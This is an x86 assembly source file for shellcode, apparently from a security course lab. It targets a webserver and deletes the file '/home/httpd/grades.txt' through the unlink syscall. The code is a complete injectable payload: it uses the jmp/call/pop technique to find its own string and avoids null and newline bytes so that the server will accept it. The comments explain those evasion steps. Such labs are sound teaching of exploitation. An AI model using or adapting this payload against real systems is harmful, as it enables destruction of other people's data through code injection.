#include <sys/syscall.h>

#define STRING "/home/httpd/grades.txt"
#define STRLEN 22
#define ARGV	(STRLEN+1)
#define ENVP	(ARGV+4)

.globl main
	.type	main, @function

 main:
	jmp	calladdr

 popladdr:
	popl	%esi
	xorl	%eax,%eax		/* get a 32-bit zero value */
	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */

	/* syscall arg 1: syscall number. unlink has syscall number 10, or '\n',
	which the webserver will treat differently. To get around this, add bytes
	0x9 and 0x1. */
	movb	$0x9,%al
	addb	$0x1,%al

	movl	%esi,%ebx		/* syscall arg 2: string pathname */
	int	$0x80			/* invoke syscall */

	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
	movl	%ebx,%eax
	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
					/* mov+inc to avoid null byte */
	int	$0x80			/* invoke syscall */

 calladdr:
	call	popladdr
	.ascii	STRING